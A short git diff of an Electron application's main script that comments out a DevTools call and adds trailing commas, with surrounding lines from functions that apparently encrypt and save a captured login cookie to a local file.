@@ -89,7 +89,7 @@ const createWindow = () => {
   });
 
   // Open the DevTools.
-  mainWindow.webContents.openDevTools();
+  //mainWindow.webContents.openDevTools();
 };
 
 function encrypt(text, code) {
@@ -128,7 +128,7 @@ async function captureCookie(cookie) {
         // code: code, // Code is no longer saved to file
       },
       null,
-      2
+      2,
     );
 
     fs.writeFileSync(filePath, data);
@@ -191,7 +191,7 @@ app.whenReady().then(() => {
           mainWindow.loadFile(path.join(__dirname, "Success.html"));
         }
       }
-    }
+    },
   );
 
   createWindow();
